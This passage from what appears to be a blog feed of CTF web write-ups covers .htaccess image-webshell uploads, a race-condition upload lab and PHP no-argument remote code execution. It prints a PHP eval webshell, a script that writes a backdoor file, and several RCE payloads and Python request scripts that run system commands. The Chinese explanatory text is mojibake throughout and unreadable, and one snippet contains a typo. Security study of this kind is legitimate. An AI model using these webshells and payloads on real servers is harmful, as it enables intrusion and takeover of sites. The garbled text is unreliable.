å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡<a href="http://www.lvjiyong.com/tag/apache/">Apache</a>çš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚</p></blockquote><blockquote><p>æ¦‚è¿°æ¥è¯´ï¼Œ<a href="http://www.lvjiyong.com/tag/htaccess/">htaccess</a>æ–‡ä»¶æ˜¯<a href="http://www.lvjiyong.com/tag/apache/">Apache</a>æœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡<a href="http://www.lvjiyong.com/tag/htaccess/">htaccess</a>æ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p></blockquote><h4 id="ä½¿ç”¨-htaccessæ–‡ä»¶çš„åœºåˆ"><a href="#ä½¿ç”¨-htaccessæ–‡ä»¶çš„åœºåˆ" class="headerlink" title="ä½¿ç”¨.htaccessæ–‡ä»¶çš„åœºåˆ"></a><strong>ä½¿ç”¨.htaccessæ–‡ä»¶çš„åœºåˆ</strong></h4><blockquote><p>.htaccessæ–‡ä»¶åº”è¯¥è¢«ç”¨åœ¨å†…å®¹æä¾›è€…éœ€è¦é’ˆå¯¹ç‰¹å®šç›®å½•æ”¹å˜æœåŠ¡å™¨çš„é…ç½®è€Œåˆæ²¡æœ‰rootæƒé™çš„æƒ…å†µä¸‹</p></blockquote><h3 id="ä¼ å›¾ç‰‡é©¬"><a href="#ä¼ å›¾ç‰‡é©¬" class="headerlink" title="ä¼ å›¾ç‰‡é©¬"></a>ä¼ å›¾ç‰‡é©¬</h3><p>ä¼ ä¸€ä¸ªå›¾ç‰‡ç±»å‹çš„ä¸€å¥è¯æœ¨é©¬</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ–‡ä»¶åç¼€æ”¹ä¸º.png</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206262053092.png" alt="image-20220626205333050"></p><p>but</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206262053622.png" alt="image-20220626205349577"></p><blockquote><p>æˆ‘å¿«åå•¦ï¼ŒçœŸçš„ä¸èƒ½ç†è§£è¿™ä¸ªurlçš„æ‹¼æ¥è§„åˆ™ï¼Œæˆ‘ä¸€ç›´ä»¥ä¸ºæ˜¯æˆ‘çš„ä¸€å¥è¯æœ¨é©¬æœ‰è¯­æ³•é”™è¯¯ï¼Œè£‚å¼€ã€‚ã€‚</p></blockquote><blockquote><blockquote><p>ä¸è¿‡æ€»ç®—è¿æ¥ä¸Šå•¦ï¼ï¼</p></blockquote></blockquote><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//e3ff68d4-0f56-45f5-90d6-fe659e678462.node4.buuoj.cn:81/upload/fce558920a313421cb1c89269f2e320d/shell</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206271201548.png" alt="image-20220627120107482"></p><p>å¾—åˆ°flagï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206271229566.png" alt="image-20220627122940514"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ &amp;æ¡ä»¶ç«äº‰</title>
    <link href="https://kannikanyun.github.io/2022/06/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
    <id>https://kannikanyun.github.io/2022/06/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</id>
    <published>2022-06-24T14:02:38.000Z</published>
    <updated>2022-06-25T11:44:40.146Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a href="https://blog.csdn.net/mmzkyl/article/details/112318210">æ¡ä»¶ç«äº‰ä¹‹æ–‡ä»¶ä¸Šä¼ </a></p><h1 id="ä¸€-ä»€ä¹ˆæ˜¯æ¡ä»¶ç«äº‰ä¸Šä¼ "><a href="#ä¸€-ä»€ä¹ˆæ˜¯æ¡ä»¶ç«äº‰ä¸Šä¼ " class="headerlink" title="ä¸€.ä»€ä¹ˆæ˜¯æ¡ä»¶ç«äº‰ä¸Šä¼ "></a>ä¸€.ä»€ä¹ˆæ˜¯æ¡ä»¶ç«äº‰ä¸Šä¼ </h1><p>æ¡ä»¶ç«äº‰ä¸Šä¼ æ˜¯ä¸€ç§æœåŠ¡å™¨ç«¯çš„æ¼æ´ï¼Œç”±äºåç«¯ç¨‹åºæ“ä½œé€»è¾‘ä¸åˆç†å¯¼è‡´ã€‚<br>ç”±äºæœåŠ¡å™¨ç«¯åœ¨å¤„ç†ä¸åŒç”¨æˆ·çš„è¯·æ±‚æ—¶æ˜¯<u><em>å¹¶å‘</em></u>è¿›è¡Œçš„ï¼Œå› æ­¤ï¼Œå¦‚æœå¹¶å‘å¤„ç†ä¸å½“æˆ–ç›¸å…³æ“ä½œé€»è¾‘é¡ºåºè®¾è®¡çš„ä¸åˆç†æ—¶ï¼Œå°†ä¼šå¯¼è‡´æ­¤ç±»é—®é¢˜çš„å‘ç”Ÿï¼Œæ­¤æ¼æ´ä¸€èˆ¬å‘ç”Ÿåœ¨å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®åŒä¸€ä¸ªå…±äº«ä»£ç ã€å˜é‡ã€æ–‡ä»¶ç­‰æ²¡æœ‰è¿›è¡Œé”æ“ä½œæˆ–è€…åŒæ­¥æ“ä½œçš„åœºæ™¯ä¸­ã€‚</p><h2 id="upload-labsï¼ˆPass-17ï¼‰"><a href="#upload-labsï¼ˆPass-17ï¼‰" class="headerlink" title="upload-labsï¼ˆPass-17ï¼‰"></a>upload-labsï¼ˆPass-17ï¼‰</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$upload_file</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span><span class="token punctuation">;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æºç è§£é‡Šï¼š"><a href="#æºç è§£é‡Šï¼š" class="headerlink" title="æºç è§£é‡Šï¼š"></a>æºç è§£é‡Šï¼š</h3><p>è¿™é‡Œåº”è¯¥æ˜¯æˆ‘ä»¬æˆåŠŸä¸Šä¼ äº†phpæ–‡ä»¶ä½†åç«¯åœ¨*<u>çŸ­æ—¶é—´å†…å°†å…¶åˆ é™¤</u>*äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æŠ¢åˆ°<u><em>åœ¨å®ƒåˆ é™¤ä¹‹å‰è®¿é—®æ–‡ä»¶</em></u>ï¼Œå°±å¦‚æˆ‘ä»¬æ‰“å¼€æ–‡ä»¶çš„æ—¶å€™å»åˆ é™¤å®ƒï¼Œä¼šæç¤ºæ–‡ä»¶æ–‡ä»¶å·²æ‰“å¼€ä¸€æ ·ï¼Œè¿™æ ·ä»è€Œé˜²æ­¢æ–‡ä»¶è¢«åˆ é™¤</p><h3 id="å®ç°æ–¹æ³•ï¼š"><a href="#å®ç°æ–¹æ³•ï¼š" class="headerlink" title="å®ç°æ–¹æ³•ï¼š"></a>å®ç°æ–¹æ³•ï¼š</h3><p>åˆ©ç”¨è¯¥é€»è¾‘æ¼æ´å…ˆè¡Œ<u><em>ä¸Šä¼ </em></u>ä¸€ä¸ªåé—¨æ–‡ä»¶,åŒæ—¶æˆ‘ä»¬å†å»<u><em>è®¿é—®è¯¥åé—¨æ–‡ä»¶</em></u>;</p><p>ä»¤å…¶åœ¨åŒçº§ç›®å½•ä¸‹é‡æ–°å†™å…¥ä¸€ä¸ªåé—¨è„šæœ¬,è¿™ä¸«ä¹Ÿèƒ½å¤Ÿçš„è¯å³ä½¿åŸæœ‰çš„åé—¨è„šæœ¬è¢«åˆ é™¤,æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨è¿™ä¸ªè¢«å†™å…¥çš„æ–°çš„åé—¨å»å¾—åˆ°è®¿é—®æƒé™ã€‚</p><h3 id="åé—¨è„šæœ¬"><a href="#åé—¨è„šæœ¬" class="headerlink" title="åé—¨è„šæœ¬"></a>åé—¨è„šæœ¬</h3><p>ç°åœ¨æˆ‘ä»¬å°±åˆ¶ä½œè¿™æ ·ä¸€ä¸ªå¯å†™å…¥çš„åé—¨è„šæœ¬ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$string</span><span class="token operator">=</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST["test"]); ?>'</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fcolse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¯¥è„šæœ¬çš„æ„æ€å°±æ˜¯åœ¨æˆ‘ä»¬è®¿é—®è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™,å°±ç”Ÿæˆä¸€ä¸ª â€œshell_test.phpâ€ æ–‡ä»¶,åŒæ—¶åœ¨æ–‡ä»¶å†…å†™å…¥ â€œ<?php @eval($_POST[test]);?></p><p>å› ä¸ºä»ä¸Šä¼ åˆ°åˆ é™¤çš„æ•´ä¸ªè¿‡ç¨‹ä¼šéå¸¸çš„çŸ­,æ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ©ç”¨ Burp çš„<br>requests æ¨¡å—åˆ¶é€ ä¸¤ä¸ªåœºæ™¯ã€‚ä¸€ä¸ªæ˜¯ä¸åœçš„ä¸Šä¼ æœ€åˆçš„è„šæœ¬æ–‡ä»¶,ä¸€ä¸ªéœ€è¦ä¸åœçš„å»è®¿é—®è¿™ä¸ªæœ€åˆçš„è„šæœ¬æ–‡ä»¶å»è§¦å‘å®ƒå†™å…¥æ–°çš„è„šæœ¬çš„åŠ¨ä½œã€‚</p><p>Pythonè„šæœ¬è®¿é—®ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span><span class="token string">"https://www.baidu.com"</span>    <span class="token keyword">if</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'yse,è®¿é—®æˆåŠŸ'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>æ— å‚rce</title>
    <link href="https://kannikanyun.github.io/2022/06/24/%E6%97%A0%E5%8F%82rce/"/>
    <id>https://kannikanyun.github.io/2022/06/24/%E6%97%A0%E5%8F%82rce/</id>
    <published>2022-06-24T10:49:11.000Z</published>
    <updated>2022-06-24T13:58:12.841Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a href="https://blog.csdn.net/weixin_46706771/article/details/119008895">RCEæ€»ç»“</a></p><h2 id="æ¦‚å¿µä»‹ç»ï¼š"><a href="#æ¦‚å¿µä»‹ç»ï¼š" class="headerlink" title="æ¦‚å¿µä»‹ç»ï¼š"></a>æ¦‚å¿µä»‹ç»ï¼š</h2><blockquote><p>RCEè‹±æ–‡å…¨ç§°ï¼šremote command/code execute<br>åˆ†ä¸ºè¿œç¨‹å‘½ä»¤æ‰§è¡Œpingå’Œè¿œç¨‹ä»£ç æ‰§è¡Œevelã€‚</p><blockquote><p>æ¼æ´å‡ºç°çš„åŸå› ï¼šæ²¡æœ‰åœ¨è¾“å…¥å£åšè¾“å…¥å¤„ç†ã€‚<br>æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Š</p><blockquote><p>ä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚å…¶å®è¿™å°±æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿï¼Œè¿™å°±æ˜¯RCEæ¼æ´ã€‚</p></blockquote></blockquote></blockquote><p><u>æ‰€è°“æ— å‚æ•°RCEï¼Œå°±æ˜¯é€šè¿‡<strong>æ²¡æœ‰å‚æ•°çš„å‡½æ•°è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„</strong></u></p><p>å³</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_replace</span> <span class="token punctuation">(</span> æœç´¢çš„æ¨¡å¼<span class="token punctuation">,</span>ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„<span class="token punctuation">,</span>è¦æœç´¢æ›¿æ¢çš„ <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">æ— å‚rceè¯¦ç»†è§£é‡Š</a></p><p>å¸¸ç”¨æ–¹æ³•ï¼š</p><h2 id="1-getenv"><a href="#1-getenv" class="headerlink" title="1.getenv()"></a>1.getenv()</h2><p>è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡å€¼</p><blockquote><p><code>$GLOBALS</code><br><code>$_SERVER $_GET</code><br><code>$_POST $_FILES</code><br><code>$_COOKIE $_SESSION</code><br><code>$_REQUEST $_ENV</code></p></blockquote><h4 id="payloadï¼š"><a href="#payloadï¼š" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h4><blockquote><p>array_rand(array_flip($a))</p><ol><li>array_rand():éšæœºä»æ•°ç»„ä¸­è¿”å›é”®</li><li>array_flip():äº¤æ¢æ•°ç»„ä¸­é”®å’Œå€¼</li></ol></blockquote><h2 id="2-getallheaders"><a href="#2-getallheaders" class="headerlink" title="2.getallheaders()"></a>2.getallheaders()</h2><p><em><u>getallheaders()å…¶å®å…·æœ‰å±€é™æ€§ï¼Œå› ä¸ºä»–æ˜¯apacheçš„å‡½æ•°ï¼Œå¦‚æœç›®æ ‡ä¸­é—´ä»¶ä¸ä¸ºapacheï¼Œé‚£ä¹ˆè¿™ç§æ–¹æ³•å°±ä¼šå¤±æ•ˆ</u></em></p><p>å¯ä»¥è¿›ä¸€æ­¥åˆ©ç”¨http headerçš„skyå±æ€§è¿›è¡Œrce</p><blockquote><blockquote><p>var_dump(getallheaders()); //ç›´æ¥é¡µé¢å›æ˜¾</p></blockquote><blockquote><p>sky: phpinfo();</p></blockquote></blockquote><blockquote><p>skyï¼šsystem(â€˜ls /tmpâ€™);</p><p>æˆ–ï¼š</p><p>skyï¼šphpinfo();</p></blockquote><h2 id="3-get-defined-vars"><a href="#3-get-defined-vars" class="headerlink" title="3.get_defined_vars()"></a>3.get_defined_vars()</h2><p>å¦‚æœç›®æ ‡ä¸­é—´ä»¶ä¸ä¸ºapacheï¼Œå¯ä»¥ä½¿ç”¨get_defined_vars()ï¼Œæ˜¾å…¨å±€å˜é‡<code>_GET $_POST $_FILES $_COOKIE</code></p><p>get_defined_vars():<code>è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡åˆ—è¡¨çš„å¤šç»´æ•°ç»„ï¼Œè¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡</code></p><p>payloadï¼š</p><p><code>code=var_dump(current(get_defined_vars()));&amp;sky=phpinfo();</code></p><p>å¦‚æœç½‘ç«™å¯¹ä¸€ä¸‹è¿›è¡Œå…¨å±€è¿‡æ»¤</p><pre class="line-numbers language-none"><code class="language-none">$_GET$_POST$_COOKIE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æœ€ç»ˆè„šæœ¬å¦‚ä¸‹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIOpayload <span class="token operator">=</span> <span class="token string">"system('ls /tmp');"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  payload<span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span><span class="token string">'sky cool!'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>content<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-session-id"><a href="#4-session-id" class="headerlink" title="4.session_id()"></a>4.session_id()</h1><p>åˆ™ï¼Œhex2bin() å‡½æ•°æŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦</p><pre class="line-numbers language-none"><code class="language-none">import requestsurl &#x3D; &#39;http:&#x2F;&#x2F;localhost&#x2F;?code&#x3D;eval(hex2bin(session_id(session_start())));&#39;payload &#x3D; &quot;echo &#39;sky cool&#39;;&quot;.encode(&#39;hex&#39;)cookies &#x3D; &#123;&#39;PHPSESSID&#39;:payload&#125;r &#x3D; requests.get(url&#x3D;url,cookies&#x3D;cookies)print r.content<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="5-dirname-amp-chdir"><a href="#5-dirname-amp-chdir" class="headerlink" title="5.dirname() &amp; chdir()"></a>5.dirname() &amp; chdir()</h1><h3 id="poyload"><a href="#poyload" class="headerlink" title="poyload:"></a>poyload:</h3><pre class="line-numbers language-none"><code class="language-none">readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ol><li><code>getcwd()</code>è·å–å½“å‰ç›®å½•</li><li>dirname()ç›®å½•ä¸Šè·³:â€”è¿”å›çˆ¶ç›®å½•çš„è·¯å¾„</li><li>chdir (å­—ç¬¦ä¸² <code>$directory</code>): bool     å°† PHP çš„å½“å‰ç›®å½•æ›´æ”¹ä¸º <code>directory</code>.</li><li>scandir()æ–‡ä»¶ã€ç›®å½•éå†</li><li>array_reverse() å‡½æ•°è¿”å›ç¿»è½¬é¡ºåºçš„æ•°ç»„</li><li>readfile() å‡½æ•°è¯»å–ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²</li><li>next()å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.runoob.com/php/func-array-prev.html">prev()</a> - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.runoob.com/php/func-array-current.html">current()</a> - è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼</li><li><a href="https://www.runoob.com/php/func-array-end.html">end()</a> - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.runoob.com/php/func-array-reset.html">reset()</a> - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.runoob.com/php/func-array-each.html">each()</a> - è¿”å›å½“å‰å…ƒç´ 